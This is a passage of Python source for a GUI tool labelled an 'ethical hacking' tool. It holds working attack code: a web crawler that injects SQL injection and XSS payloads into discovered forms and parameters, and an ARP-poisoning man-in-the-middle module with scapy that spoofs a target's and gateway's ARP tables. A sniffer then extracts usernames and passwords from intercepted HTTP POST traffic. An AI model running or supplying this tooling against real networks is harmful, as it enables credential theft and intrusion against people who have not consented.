                    if self._test_xss(session, url, method, param, payload):
                        self.gui_queue.put({'type': 'vulnerability', 'data': (url, method, param, "XSS", payload)})
        self.gui_queue.put({'type': 'log', 'data': "Automated scan finished."})

    def _crawl_and_discover(self, base_url, session):
        urls_to_visit, visited_urls, scan_targets = {base_url}, set(), []
        domain_name = urlparse(base_url).netloc
        while urls_to_visit:
            url = urls_to_visit.pop()
            if url in visited_urls or urlparse(url).netloc != domain_name: continue
            self.gui_queue.put({'type': 'log', 'data': f"Crawling: {url}"})
            visited_urls.add(url)
            try:
                response = session.get(url, timeout=5)
                soup = BeautifulSoup(response.content, "html.parser")
                if get_params := list(parse_qs(urlparse(url).query).keys()):
                    scan_targets.append({'url': url, 'method': 'GET', 'params': get_params})
                for form in soup.find_all("form"):
                    action, method = urljoin(url, form.get("action")), form.get("method", "get").upper()
                    if form_params := [i.get('name') for i in form.find_all(['input', 'textarea', 'select']) if i.get('name')]:
                        scan_targets.append({'url': action, 'method': method, 'params': form_params})
                for link in soup.find_all("a", href=True):
                    full_url = urljoin(base_url, link['href'])
                    if urlparse(full_url).netloc == domain_name:
                        urls_to_visit.add(full_url)
            except requests.RequestException as e: self.gui_queue.put({'type': 'log', 'data': f"Crawl error on {url}: {e}"})
        return scan_targets

    def _test_sql_injection(self, session, url, method, param, payload):
        target_url, is_time_based = url, 'sleep' in payload.lower()
        try:
            start_time = time.time()
            if method == 'GET':
                query_params = parse_qs(urlparse(url).query); query_params[param] = payload
                target_url = urlparse(url)._replace(query=urlencode(query_params, doseq=True)).geturl()
                response = session.get(target_url, timeout=10)
            else: response = session.post(target_url, data={param: payload}, timeout=10)
            duration = time.time() - start_time
            if is_time_based and duration > 4.5: return True
            if any(err in response.text.lower() for err in ['you have an error in your sql syntax', 'warning: mysql', 'unclosed quotation mark']): return True
        except requests.RequestException: pass
        return False

    def _test_xss(self, session, url, method, param, payload):
        try:
            if method == 'GET':
                query_params = parse_qs(urlparse(url).query); query_params[param] = payload
                target_url = urlparse(url)._replace(query=urlencode(query_params, doseq=True)).geturl()
                response = session.get(target_url, timeout=5)
            else: response = session.post(url, data={param: payload}, timeout=5)
            if payload in response.text: return True
        except requests.RequestException: pass
        return False

    def get_mac(self, ip):
        try:
            ans, _ = scapy.srp(scapy.Ether(dst="ff:ff:ff:ff:ff:ff")/scapy.ARP(pdst=ip), timeout=2, verbose=False)
            if ans: return ans[0][1].src
        except Exception as e: self.log_message(f"Error getting MAC for {ip}: {e}"); return None

    def start_arp_poison(self):
        target_ip, gateway_ip = self.mitm_target_ip.get(), self.mitm_gateway_ip.get()
        if not target_ip or not gateway_ip: messagebox.showerror("Error", "Target IP and Gateway IP are required."); return

        self.start_mitm_button.config(state='disabled'); self.stop_mitm_button.config(state='normal')
        self.stop_poison_event.clear()

        self.poison_thread = threading.Thread(target=self._arp_poison_worker, args=(target_ip, gateway_ip), daemon=True)
        self.poison_thread.start()
        self.sniffer_thread = threading.Thread(target=self._credential_sniffer, args=(target_ip,), daemon=True)
        self.sniffer_thread.start()

    def stop_arp_poison(self):
        self.log_message("Stopping ARP poisoning attack...")
        self.stop_poison_event.set()
        self.start_mitm_button.config(state='normal'); self.stop_mitm_button.config(state='disabled')

    def _arp_poison_worker(self, target_ip, gateway_ip):
        self.log_message(f"Starting ARP poison against Target: {target_ip} and Gateway: {gateway_ip}")
        target_mac, gateway_mac = self.get_mac(target_ip), self.get_mac(gateway_ip)
        if not target_mac or not gateway_mac:
            self.log_message("Could not resolve MAC addresses. Halting attack."); self.stop_poison_event.set(); return
        self.log_message(f"Resolved MACs -> Target: {target_mac}, Gateway: {gateway_mac}")
        poison_victim = scapy.ARP(op=2, pdst=target_ip, hwdst=target_mac, psrc=gateway_ip)
        poison_gateway = scapy.ARP(op=2, pdst=gateway_ip, hwdst=gateway_mac, psrc=target_ip)
        try:
            while not self.stop_poison_event.is_set():
                scapy.send(poison_victim, verbose=False); scapy.send(poison_gateway, verbose=False)
                time.sleep(2)
        finally:
            self.log_message("Restoring ARP tables...")
            self._restore_arp(target_ip, gateway_ip, target_mac, gateway_mac)

    def _restore_arp(self, target_ip, gateway_ip, target_mac, gateway_mac):
        scapy.send(scapy.ARP(op=2, pdst=target_ip, hwdst="ff:ff:ff:ff:ff:ff", psrc=gateway_ip, hwsrc=gateway_mac), count=5, verbose=False)
        scapy.send(scapy.ARP(op=2, pdst=gateway_ip, hwdst="ff:ff:ff:ff:ff:ff", psrc=target_ip, hwsrc=target_mac), count=5, verbose=False)
        self.log_message("ARP tables restored.")

    def _credential_sniffer(self, target_ip):
        self.log_message("Credential sniffer started...")
        scapy.sniff(filter=f"ip host {target_ip}", prn=self.process_sniffed_packet, stop_filter=lambda x: self.stop_poison_event.is_set())
        self.log_message("Credential sniffer stopped.")
        
    def process_sniffed_packet(self, packet):
        if packet.haslayer(scapy.Raw):
            try:
                load = packet[scapy.Raw].load.decode('utf-8', errors='ignore')
                if packet.haslayer(scapy.TCP) and packet[scapy.TCP].dport == 80 and "POST" in load:
                    keywords = ['user', 'pass', 'username', 'password', 'login', 'uid', 'pwd']
                    credentials = {}
                    fields = load.split('\r\n')[-1].split('&')
                    for field in fields:
                        if '=' in field:
                            key, val = field.split('=', 1)
                            if key.lower() in keywords:
                                credentials[key] = unquote(val)
                    if len(credentials) > 1:
                        timestamp = datetime.now().strftime('%H:%M:%S')
                        log_entry = f"[{timestamp}] Potential Credentials Found (HTTP):\n"
                        for key, val in credentials.items():
                            log_entry += f"  {key}: {val}\n"
                        self.gui_queue.put({'type': 'mitm_credential', 'data': log_entry})
            except Exception: pass

if __name__ == "__main__":
    root = tk.Tk()
    app = EthicalHackingTool(root)
    root.mainloop()
